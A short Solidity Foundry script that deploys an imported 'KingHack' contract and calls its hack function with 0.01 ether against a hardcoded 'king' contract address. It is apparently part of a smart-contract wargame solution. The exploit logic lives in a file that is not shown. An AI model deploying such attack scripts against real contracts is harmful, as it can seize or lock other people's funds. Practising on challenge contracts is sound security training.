// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/KingHack.sol";

contract KingHackScript is Script {
    uint256 deployerPrivateKey;
    address king = 0x5b8Ae1BD73B9e5084154e0920bb86dB09db0138a;

    function run() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        KingHack kingHack = new KingHack();
        kingHack.hack{value: 0.01 * 1e18}(king);
        
        vm.stopBroadcast();
    }
}
